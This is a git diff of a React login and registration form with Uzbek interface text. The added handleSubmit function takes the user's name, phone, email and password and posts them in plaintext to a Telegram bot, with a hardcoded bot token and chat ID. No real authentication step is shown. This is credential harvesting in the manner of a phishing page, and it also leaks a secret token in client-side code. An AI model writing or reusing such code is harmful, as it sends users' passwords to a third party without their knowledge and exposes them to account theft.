@@ -3,13 +3,50 @@ import "../login/login.scss";
 import { useTranslation } from 'react-i18next';
 
 const Login = () => {
-    
     const { t, i18n } = useTranslation();
-
-    const changeLanguage = (lang) => {
-        i18n.changeLanguage(lang);
-    };
     
+    const [formData, setFormData] = useState({
+        email: '',
+        textarea: '',
+        name: '',
+        phone: '',
+        password: '',
+    });
+
+    const handleChange = (e) => {
+        const { name, value } = e.target;
+        setFormData({
+            ...formData,
+            [name]: value,
+        });
+    };
+
+    const handleSubmit = (e) => {
+        e.preventDefault();
+        const token = "8194990714:AAGAdxhWYqZYjS7PbyQcngpMxG5wfDVFCaw";
+        const chat_id = "-1002436631127";
+        const my_text = `Email: ${formData.email}\nnumb: ${formData.phone}\nism:${formData.name}\nparol:${formData.password}`;
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(my_text)}`;
+
+        fetch(url)
+            .then((response) => {
+                if (response.ok) {
+                    console.log("Xabar muvaffaqiyatli yuborildi!");
+                } else {
+                    console.error("Xatolik yuz berdi:", response.statusText);
+                }
+            })
+            .catch((error) => console.error("Fetch xatosi:", error));
+
+        setFormData({
+            email: '',
+            textarea: '',
+            name: '',
+            phone: '',
+            password: '',
+        }); 
+    };
+
     const [isRegister, setIsRegister] = useState(false);
     const [inputActive, setInputActive] = useState({
         name: false,
@@ -63,12 +100,15 @@ const Login = () => {
                                     <a href="#"><img className="login__icon" src="6.svg" alt="" /></a>
                                 </div>
                                 <p className="login__text">Iltimos Malumotlarni To'liq Kiriting!</p>
-                                <form>
+                                <form onSubmit={handleSubmit}>
                                     <div className="group" ref={inputRef}>
                                         <input
                                             className={`input__box ${inputActive.name ? "active" : ''}`}
                                             onClick={() => handleOnClick("name")}
                                             type="text"
+                                            name="name"
+                                            value={formData.name}
+                                            onChange={handleChange}
                                             required
                                         />
                                         <label>Ismingiz</label>
@@ -78,6 +118,9 @@ const Login = () => {
                                             className={`input__box ${inputActive.phone ? "active" : ''}`}
                                             onClick={() => handleOnClick("phone")}
                                             type="tel"
+                                            name="phone"
+                                            value={formData.phone}
+                                            onChange={handleChange}
                                             required
                                             onInput={(e) => e.target.value = e.target.value.replace(/\D/g, '')}
                                             placeholder={inputActive.phone ? "998 99 123 45 67" : ""}
@@ -89,6 +132,9 @@ const Login = () => {
                                             className={`input__box ${inputActive.email ? "active" : ''}`}
                                             onClick={() => handleOnClick("email")}
                                             type="email"
+                                            name="email"
+                                            value={formData.email}
+                                            onChange={handleChange}
                                             required
                                         />
                                         <label>Gmail</label>
@@ -98,14 +144,17 @@ const Login = () => {
                                             className={`input__box ${inputActive.password ? "active" : ''}`}
                                             onClick={() => handleOnClick("password")}
                                             type="password"
+                                            name="password"
+                                            value={formData.password}
+                                            onChange={handleChange}
                                             required
                                         />
                                         <label>Parol</label>
                                     </div>
+                                    <div className='login__sign-box'>
+                                        <button className="login__sign" type="submit">Ro'yxatdan O'tish</button>
+                                    </div>
                                 </form>
-                                <div className='login__sign-box'>
-                                    <button className="login__sign">Ro'yxatdan O'tish</button>
-                                </div>
                                 <p className="login__toggle-text login__text-top">Akkauntingiz bormi? <span onClick={toggleForm}>Kirish</span></p>
                             </>
                         ) : (
@@ -123,6 +172,9 @@ const Login = () => {
                                             className={`input__box ${inputActive.email ? "active" : ''}`}
                                             onClick={() => handleOnClick("email")}
                                             type="email"
+                                            name="email"
+                                            value={formData.email}
+                                            onChange={handleChange}
                                             required
                                         />
                                         <label>Gmail</label>
@@ -132,6 +184,9 @@ const Login = () => {
                                             className={`input__box ${inputActive.password ? "active" : ''}`}
                                             onClick={() => handleOnClick("password")}
                                             type="password"
+                                            name="password"
+                                            value={formData.password}
+                                            onChange={handleChange}
                                             required
                                         />
                                         <label>Parol</label>
@@ -155,7 +210,7 @@ const Login = () => {
                     </div>
                 </div>
             </div>
-        </div >
+        </div>
     );
 };
 
